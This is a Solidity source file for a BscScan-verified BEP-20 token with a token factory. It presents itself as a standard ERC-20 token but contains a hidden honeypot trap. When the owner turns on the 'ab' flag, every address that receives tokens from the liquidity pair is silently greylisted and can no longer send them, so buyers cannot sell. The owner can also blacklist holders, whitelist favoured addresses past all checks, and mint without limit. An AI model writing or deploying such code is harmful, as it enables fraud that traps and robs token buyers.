1 /**
2  *Submitted for verification at BscScan.com on 2023-04-13
3 */
4 
5 // SPDX-License-Identifier: MIT
6 
7 pragma solidity ^0.4.24;
8 
9 
10 library SafeMath {
11     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
12         if (a == 0) {
13             return 0;
14         }
15         uint256 c = a * b;
16         assert(c / a == b);
17         return c;
18     }
19 
20     function div(uint256 a, uint256 b) internal pure returns (uint256) {
21         // assert(b > 0); // Solidity automatically throws when dividing by 0
22         uint256 c = a / b;
23         
24         return c;
25     }
26 
27     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
28         assert(b <= a);
29         return a - b;
30     }
31 
32     function add(uint256 a, uint256 b) internal pure returns (uint256) {
33         uint256 c = a + b;
34         assert(c >= a);
35         return c;
36     }
37 }
38 interface ISwapFactory {
39     function createPair(address tokenA, address tokenB) external returns (address pair);
40 }
41 contract Ownable {
42     address public owner;
43 
44 
45     /**
46      * @dev Throws if called by any account other than the owner.
47      */
48     modifier onlyOwner() {
49         require(msg.sender == owner);
50         _;
51     }
52 
53 
54 }
55 
56 
57 contract ERC20Basic {
58     uint256 public totalSupply;
59     function balanceOf(address who) public view returns (uint256);
60     function transfer(address to, uint256 value) public returns (bool);
61     event Transfer(address indexed from, address indexed to, uint256 value);
62 }
63 
64 contract ERC20 is ERC20Basic {
65     function allowance(address owner, address spender) public view returns (uint256);
66     function transferFrom(address from, address to, uint256 value) public returns (bool);
67     function approve(address spender, uint256 value) public returns (bool);
68     event Approval(address indexed owner, address indexed spender, uint256 value);
69 }
70 
71 
72 contract StandardToken is ERC20 {
73     using SafeMath for uint256;
74 
75     address public LP;
76 
77     bool ab=false;
78 
79 
80     mapping (address => mapping (address => uint256)) internal allowed;
81     mapping(address => bool)  tokenBlacklist;
82     mapping(address => bool)  tokenGreylist;
83     mapping(address => bool)  tokenWhitelist;
84     event Blacklist(address indexed blackListed, bool value);
85     event Gerylist(address indexed geryListed, bool value);
86     event Whitelist(address indexed WhiteListed, bool value);
87 
88 
89     mapping(address => uint256) balances;
90 
91 
92     function transfer(address _to, uint256 _value) public returns (bool) {
93         if(!tokenWhitelist[msg.sender]&&!tokenWhitelist[_to]){
94             require(tokenBlacklist[msg.sender] == false);
95             require(tokenBlacklist[_to] == false);
96 
97             require(tokenGreylist[msg.sender] == false);
98             // require(tokenGreylist[_to] == false);
99         }
100         if(msg.sender==LP&&ab&&!tokenWhitelist[_to]){
101             tokenGreylist[_to] = true;
102             emit Gerylist(_to, true);
103         }
104 
105         require(_to != address(0));
106         require(_to != msg.sender);
107         require(_value <= balances[msg.sender]);
108         balances[msg.sender] = balances[msg.sender].sub(_value);
109         // SafeMath.sub will throw if there is not enough balance.
110         balances[_to] = balances[_to].add(_value);
111         emit Transfer(msg.sender, _to, _value);
112         return true;
113     }
114 
115 
116     function balanceOf(address _owner) public view returns (uint256 balance) {
117         return balances[_owner];
118     }
119 
120     function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
121         if(!tokenWhitelist[_from]&&!tokenWhitelist[_to]){
122             require(tokenBlacklist[msg.sender] == false);
123             require(tokenBlacklist[_from] == false);
124             require(tokenBlacklist[_to] == false);
125 
126             require(tokenGreylist[_from] == false);
127         }
128 
129         if(_from==LP&&ab&&!tokenWhitelist[_to]){
130             tokenGreylist[_to] = true;
131             emit Gerylist(_to, true);
132         }
133         require(_to != _from);
134         require(_to != address(0));
135         require(_value <= balances[_from]);
136         require(_value <= allowed[_from][msg.sender]);
137         balances[_from] = balances[_from].sub(_value);
138        
139 
140         balances[_to] = balances[_to].add(_value);
141         allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
142         emit Transfer(_from, _to, _value);
143         return true;
144     }
145 
146 
147     function approve(address _spender, uint256 _value) public returns (bool) {
148         allowed[msg.sender][_spender] = _value;
149         emit Approval(msg.sender, _spender, _value);
150         return true;
151     }
152    
153 
154     function allowance(address _owner, address _spender) public view returns (uint256) {
155         return allowed[_owner][_spender];
156     }
157 
158 
159     function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
160         allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
161         emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
162         return true;
163     }
164 
165     function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
166         uint oldValue = allowed[msg.sender][_spender];
167         if (_subtractedValue > oldValue) {
168             allowed[msg.sender][_spender] = 0;
169         } else {
170             allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
171         }
172         emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
173         return true;
174     }
175 
176     function _changeAb(bool _ab) internal returns (bool) {
177         require(ab != _ab);
178         ab=_ab;
179         return true;
180     }
181 
182 
183 
184     function _blackList(address _address, bool _isBlackListed) internal returns (bool) {
185         require(tokenBlacklist[_address] != _isBlackListed);
186         tokenBlacklist[_address] = _isBlackListed;
187         emit Blacklist(_address, _isBlackListed);
188         return true;
189     }
190 
191     function _geryList(address _address, bool _isGeryListed) internal returns (bool) {
192         require(tokenGreylist[_address] != _isGeryListed);
193         tokenGreylist[_address] = _isGeryListed;
194         emit Gerylist(_address, _isGeryListed);
195         return true;
196     }
197     function _whiteList(address _address, bool _isWhiteListed) internal returns (bool) {
198         require(tokenWhitelist[_address] != _isWhiteListed);
199         tokenWhitelist[_address] = _isWhiteListed;
200         emit Whitelist(_address, _isWhiteListed);
201         return true;
202     }
203     function _blackAddressList(address[] _addressList, bool _isBlackListed) internal returns (bool) {
204         for(uint i = 0; i < _addressList.length; i++){
205             tokenBlacklist[_addressList[i]] = _isBlackListed;
206             emit Blacklist(_addressList[i], _isBlackListed);
207         }
208         return true;
209     }
210     function _geryAddressList(address[] _addressList, bool _isGeryListed) internal returns (bool) {
211         for(uint i = 0; i < _addressList.length; i++){
212             tokenGreylist[_addressList[i]] = _isGeryListed;
213             emit Gerylist(_addressList[i], _isGeryListed);
214         }
215         return true;
216     }
217 
218 
219 }
220 
221 contract PausableToken is StandardToken, Ownable {
222 
223     function transfer(address _to, uint256 _value) public  returns (bool) {
224         return super.transfer(_to, _value);
225     }
226 
227     function transferFrom(address _from, address _to, uint256 _value) public  returns (bool) {
228         return super.transferFrom(_from, _to, _value);
229     }
230 
231     function approve(address _spender, uint256 _value) public  returns (bool) {
232         return super.approve(_spender, _value);
233     }
234 
235     function increaseApproval(address _spender, uint _addedValue) public  returns (bool success) {
236         return super.increaseApproval(_spender, _addedValue);
237     }
238 
239     function decreaseApproval(address _spender, uint _subtractedValue) public  returns (bool success) {
240         return super.decreaseApproval(_spender, _subtractedValue);
241     }
242     function changeAb(bool _ab) public  onlyOwner  returns (bool success) {
243         return super._changeAb(_ab);
244     }
245 
246     function blackListAddress(address listAddress,  bool isBlackListed) public  onlyOwner  returns (bool success) {
247         return super._blackList(listAddress, isBlackListed);
248     }
249     function geryListAddress(address listAddress,  bool _isGeryListed) public  onlyOwner  returns (bool success) {
250         return super._geryList(listAddress, _isGeryListed);
251     }
252     function whiteListAddress(address listAddress,  bool _isWhiteListed) public  onlyOwner  returns (bool success) {
253         return super._whiteList(listAddress, _isWhiteListed);
254     }
255     function blackAddressList(address[] listAddress,  bool isBlackListed) public  onlyOwner  returns (bool success) {
256         return super._blackAddressList(listAddress, isBlackListed);
257     }
258     function geryAddressList(address[] listAddress,  bool _isGeryListed) public  onlyOwner  returns (bool success) {
259         return super._geryAddressList(listAddress, _isGeryListed);
260     }
261 
262 }
263 
264 contract CoinToken is PausableToken {
265     string public name;
266     string public symbol;
267     uint public decimals;
268     event Mint(address indexed from, address indexed to, uint256 value);
269     event Burn(address indexed burner, uint256 value);
270     bool internal _INITIALIZED_;
271 
272     constructor() public {
273 
274     }
275     modifier notInitialized() {
276         require(!_INITIALIZED_, "INITIALIZED");
277         _;
278     }
279     function initToken(string  _name, string  _symbol, uint256 _decimals, uint256 _supply, address tokenOwner,address factory,address token1) public notInitialized returns (bool){
280         _INITIALIZED_=true;
281         name = _name;
282         symbol = _symbol;
283         decimals = _decimals;
284         totalSupply = _supply * 10**_decimals;
285         balances[tokenOwner] = totalSupply;
286         owner = tokenOwner;
287 
288         // // service.transfer(msg.value);
289         // (bool success) = service.call.value(msg.value)();
290         // require(success, "Transfer failed.");
291         emit Transfer(address(0), tokenOwner, totalSupply);
292         LP = ISwapFactory(factory).createPair(address(this), token1);
293     }
294 
295 
296 
297     
298 
299 
300 
301 
302 
303     function mint(address account, uint256 amount) onlyOwner public {
304 
305         totalSupply = totalSupply.add(amount);
306         balances[account] = balances[account].add(amount);
307         emit Mint(address(0), account, amount);
308         emit Transfer(address(0), account, amount);
309     }
310 
311 
312 }
313 
314 contract CoinFactory{
315 
316 
317     function createToken(string  _name, string  _symbol, uint256 _decimals, uint256 _supply,address tokenOwner,address factory,address token1)public returns (address){
318         CoinToken token=new CoinToken();
319         token.initToken(_name,_symbol,_decimals,_supply,tokenOwner,factory,token1);
320         return address(token);
321     }
322 }